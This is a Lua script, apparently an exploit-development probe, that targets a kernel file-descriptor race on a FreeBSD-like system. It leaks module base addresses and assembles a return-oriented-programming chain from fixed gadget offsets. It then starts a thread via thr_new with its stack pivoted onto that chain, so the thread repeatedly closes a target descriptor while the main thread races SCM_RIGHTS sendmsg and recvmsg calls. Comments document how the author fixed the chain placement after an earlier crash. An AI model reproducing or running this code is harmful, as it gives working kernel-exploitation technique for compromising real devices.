-- CRASH_CLASS: MODERATE
-- PROBE 534b: fd-close race — fixed ROP chain placement
--
-- 534a crashed because the ROP chain was placed at stack_top
-- and grew upward past the stack mapping.
-- Fix: place chain data BELOW stack_top with enough room,
-- and set start_func so RSP points to chain data.
--
-- Simplified: fewer iterations (50), linear chain, proper placement.

print("=== PROBE 534b: FD RACE FIX ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_socketpair = make_syscall(135)
local sc_sendmsg = make_syscall(28)
local sc_recvmsg = make_syscall(27)
local sc_close = make_syscall(6)
local sc_nanosleep = make_syscall(240)
local sc_455 = make_syscall(455)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local fn_addr = lk + uint64(0xB57)

-- Create socketpairs
local sv = memory.alloc(8)
zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local tx_fd = rd(sv); local rx_fd = rd(sv + 4)
print("transport: tx=" .. tx_fd .. " rx=" .. rx_fd)

zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local target_fd = rd(sv); local target_peer = rd(sv + 4)
print("target: fd=" .. target_fd .. " peer=" .. target_peer)

-- Shared memory
local shared = memory.alloc(0x100)
zero(shared, 0x100)

-- Stack + TCB
local stack_size = 0x200000  -- 2 MB
local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for toff = 0, 0x100, 8 do wq(tcb_page + toff, tcb_page) end
local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb_page)

-- Build ROP chain in the MIDDLE of the stack (not at top)
-- thr_new: RSP = ((stack_base + stack_size) & ~0xF) - 8
-- start_func(arg) is called with this RSP.
-- pop_rax_ret as start_func: pops rax from [RSP], RSP += 8
-- Then `ret` pops RIP from [RSP], RSP += 8
-- So chain data starts at the initial RSP value

-- Calculate initial RSP
local stack_top_n = to_num(stack_base) + stack_size
local aligned_rsp = math.floor(stack_top_n / 16) * 16 - 8

-- Place chain data starting at (aligned_rsp - chain_size)
-- so it fits WITHIN the stack allocation.
-- Chain: sysarch + 50 close + store counter + thr_exit
-- Each close: pop_rax(2) + pop_rdi(2) + fn_addr(1) = 5 qwords = 40 bytes
-- With rv store (first 10): +3 qwords = 24 bytes
-- sysarch: 7 qwords = 56 bytes
-- exit: 6 qwords = 48 bytes
-- Total: 56 + 50*40 + 10*24 + 48 = 56 + 2000 + 240 + 48 = 2344 bytes
-- Plus counter store: 6 qwords = 48 bytes
-- Grand total: ~2400 bytes. Place at aligned_rsp - 4096

local chain_data = aligned_rsp - 0x2000  -- 8KB below top
local chain_addr = uint64(chain_data)
local i = 0
local function emit(v) wq(chain_addr + i, v); i = i + 8 end

local ITERS = 50

-- sysarch(129, tcb_ptr)
emit(uint64(165))  -- first pop by pop_rax_ret (start_func)
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(fn_addr)

-- 50 x close(target_fd)
for iter = 0, ITERS - 1 do
    emit(pop_rax_ret); emit(uint64(6))
    emit(pop_rdi_ret); emit(uint64(target_fd))
    emit(fn_addr)
    if iter < 10 then
        emit(pop_rdi_ret); emit(shared + 4 + iter * 4)
        emit(mov_rdi_rax_ret)
    end
end

-- Store done marker
emit(pop_rax_ret); emit(uint64(ITERS))
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

-- thr_exit(0)
emit(pop_rax_ret); emit(uint64(431))
emit(pop_rdi_ret); emit(uint64(0))
emit(fn_addr)

print("chain: " .. i .. " bytes at " .. string.format("0x%X", chain_data))

-- Now: thr_new needs RSP to point to chain_data
-- thr_new sets RSP = aligned_rsp. But we want RSP = chain_data.
-- thr_new(start_func, arg): start_func is called with RSP at stack_top.
--
-- Trick: set stack_size such that (stack_base + stack_size) & ~0xF - 8 = chain_data
-- OR: use a pivot gadget
--
-- Simplest: put chain data AT aligned_rsp. The chain grows upward from there.
-- We have 0x2000 of data. aligned_rsp + 0x2000 would be past stack_top.
-- So we need the chain to be AT aligned_rsp AND within the stack.
--
-- The real issue: thr_new puts RSP at the TOP of the stack.
-- Chain pops grow RSP upward. So data must be above RSP = above stack_top.
-- That's outside the mapping.
--
-- SOLUTION: Make the stack_size smaller so aligned_rsp lands IN the middle.
-- Effective: stack_base stays, reduce stack_size so top = chain_data.
-- Then chain_data..chain_data+chain_bytes is still within the mmap.

-- Let's redo: use a separate mmap for the chain (not the "stack")
-- Just use a large mmap, put chain in the middle, set stack_base/size
-- so RSP lands at chain start.

-- Approach: one big 4MB mmap. Chain at offset 2MB.
-- stack_base = mmap_start, stack_size = 2MB + 8 → RSP ≈ mmap+2MB
-- Chain data at mmap+2MB (= RSP position)
-- Chain grows upward into the upper 2MB — plenty of room.

local big_size = 0x400000  -- 4 MB
local ok_big, big_base = pcall(function()
    return sc_mmap(uint64(0), uint64(big_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local big_n = to_num(big_base)
print("big_mmap=" .. q(big_base))

-- Put chain at big_base + 0x200000 (2 MB in)
local chain_off = 0x200000
local chain_start = big_n + chain_off
i = 0
chain_addr = uint64(chain_start)

-- Re-emit chain at new location
emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(fn_addr)

for iter = 0, ITERS - 1 do
    emit(pop_rax_ret); emit(uint64(6))
    emit(pop_rdi_ret); emit(uint64(target_fd))
    emit(fn_addr)
    if iter < 10 then
        emit(pop_rdi_ret); emit(shared + 4 + iter * 4)
        emit(mov_rdi_rax_ret)
    end
end

emit(pop_rax_ret); emit(uint64(ITERS))
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

emit(pop_rax_ret); emit(uint64(431))
emit(pop_rdi_ret); emit(uint64(0))
emit(fn_addr)

-- Set stack_base / stack_size so RSP = chain_start
-- RSP = ((stack_base + stack_size) & ~0xF) - 8
-- Want: chain_start = RSP
-- chain_start + 8 = (stack_base + stack_size) & ~0xF
-- If chain_start is 16-aligned: stack_base + stack_size = chain_start + 8
-- stack_base = big_base, stack_size = chain_off + 8

local param_stack_base = big_base
local param_stack_size = chain_off + 8  -- so RSP = chain_start

-- Verify: ((big_n + chain_off + 8) & ~0xF) - 8
local computed_rsp = math.floor((big_n + chain_off + 8) / 16) * 16 - 8
print("computed_rsp=" .. string.format("0x%X", computed_rsp) .. " chain_start=" .. string.format("0x%X", chain_start))

-- thr_param
local thr_param = memory.alloc(0x40)
zero(thr_param, 0x40)
wq(thr_param, pop_rax_ret)                -- start_func
wq(thr_param + 8, uint64(0))              -- arg
wq(thr_param + 0x10, param_stack_base)    -- stack_base
wq(thr_param + 0x18, uint64(param_stack_size))
wq(thr_param + 0x30, uint64(memory.alloc(8)))  -- child_tid

print("")
print("[RACE] Starting child + main loop")

-- Launch child
pcall(function() sc_455(uint64(thr_param), uint64(0x38)) end)

-- Main thread: sendmsg(SCM_RIGHTS) loop
local iov_data = memory.alloc(8)
wq(iov_data, uint64(0x41))
local iov_struct = memory.alloc(16)
wq(iov_struct, uint64(iov_data))
wq(iov_struct + 8, uint64(1))

local cmsg_buf = memory.alloc(32)
zero(cmsg_buf, 32)
wd(cmsg_buf, 16)         -- cmsg_len
wd(cmsg_buf + 4, 0xFFFF) -- SOL_SOCKET
wd(cmsg_buf + 8, 1)      -- SCM_RIGHTS
wd(cmsg_buf + 12, target_fd)

local msghdr = memory.alloc(64)
zero(msghdr, 64)
wq(msghdr + 0x10, uint64(iov_struct))
wd(msghdr + 0x18, 1)
wq(msghdr + 0x20, uint64(cmsg_buf))
wd(msghdr + 0x28, 24)

local send_ok = 0
local send_fail = 0
local anomalies = 0

-- Recv structures (reusable)
local r_cmsg = memory.alloc(32)
local r_iov_d = memory.alloc(8)
local r_iov = memory.alloc(16)
wq(r_iov, uint64(r_iov_d)); wq(r_iov + 8, uint64(8))
local r_mh = memory.alloc(64)

for iter = 1, ITERS do
    wd(cmsg_buf + 12, target_fd)
    local ok_s, srv = pcall(function()
        return sc_sendmsg(uint64(tx_fd), uint64(msghdr), uint64(0))
    end)
    local sn = ok_s and to_num(srv) or -999

    if sn >= 0 then
        send_ok = send_ok + 1
        -- Drain
        zero(r_cmsg, 32); zero(r_mh, 64)
        wq(r_mh + 0x10, uint64(r_iov)); wd(r_mh + 0x18, 1)
        wq(r_mh + 0x20, uint64(r_cmsg)); wd(r_mh + 0x28, 32)
        pcall(function() sc_recvmsg(uint64(rx_fd), uint64(r_mh), uint64(0)) end)
        local rfd = rd(r_cmsg + 12)
        if rfd and rfd > 0 and rfd ~= target_fd then
            anomalies = anomalies + 1
            print(string.format("  *** iter %d: received fd %d (expected %d) ***", iter, rfd, target_fd))
        end
        if rfd and rfd > 0 then
            pcall(function() sc_close(uint64(rfd)) end)
        end
    else
        send_fail = send_fail + 1
    end
end

-- Wait for child
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local child_done = rd(shared)
local close_rvs = ""
for j = 0, 9 do
    local crv = rd(shared + 4 + j * 4)
    if crv then
        if crv < 0 then crv = crv + 0x100000000 end
        close_rvs = close_rvs .. crv .. " "
    end
end

print("")
print("[RESULTS]")
print("  send_ok=" .. send_ok .. " fail=" .. send_fail .. " anomalies=" .. anomalies)
print("  child_done=" .. (child_done or "nil") .. "/" .. ITERS)
print("  close_rvs: " .. close_rvs)

pcall(function() sc_close(uint64(tx_fd)) end)
pcall(function() sc_close(uint64(rx_fd)) end)
pcall(function() sc_close(uint64(target_peer)) end)

print("=== 534b DONE ===")
